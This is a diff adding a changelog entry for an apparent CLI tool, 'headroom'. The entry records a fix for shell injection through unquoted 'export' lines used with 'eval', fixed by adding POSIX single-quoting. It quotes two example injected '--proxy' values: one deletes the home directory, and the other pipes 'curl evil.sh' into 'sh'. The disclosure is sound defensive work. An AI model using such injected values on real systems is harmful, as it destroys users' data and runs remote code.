@@ -6,6 +6,19 @@ the crate starts publishing releases.
 
 ---
 
+## `headroom env`/`wrap` printed unquoted shell exports
+**2026-08-04** · documented usage is `eval "$(headroom env)"`
+
+- `headroom env` and `headroom wrap`'s whole documented usage is
+  `eval "$(headroom env)"` / `eval "$(headroom wrap {agent} --proxy {proxy})"`. Both
+  printed `export NAME={value}` with no quoting, so a `--proxy` value containing
+  shell metacharacters — `http://x; rm -rf ~`, `` http://x$(curl evil.sh|sh) `` —
+  executed the moment that documented usage pattern ran it.
+- Added `shell_quote`: single-quotes the whole value and escapes an embedded single
+  quote as `'\''` (close, escaped-literal-quote, reopen) — the one fully general
+  POSIX quoting rule. Applied to `env`, `wrap`, and the generated deploy manifests'
+  `HEADROOM_UPSTREAM`/binary path line, which had the same defect.
+
 ## Clearing an override with an empty value could permanently shadow the environment
 **2026-08-04** · `extend` stored the empty string instead of removing the key
 
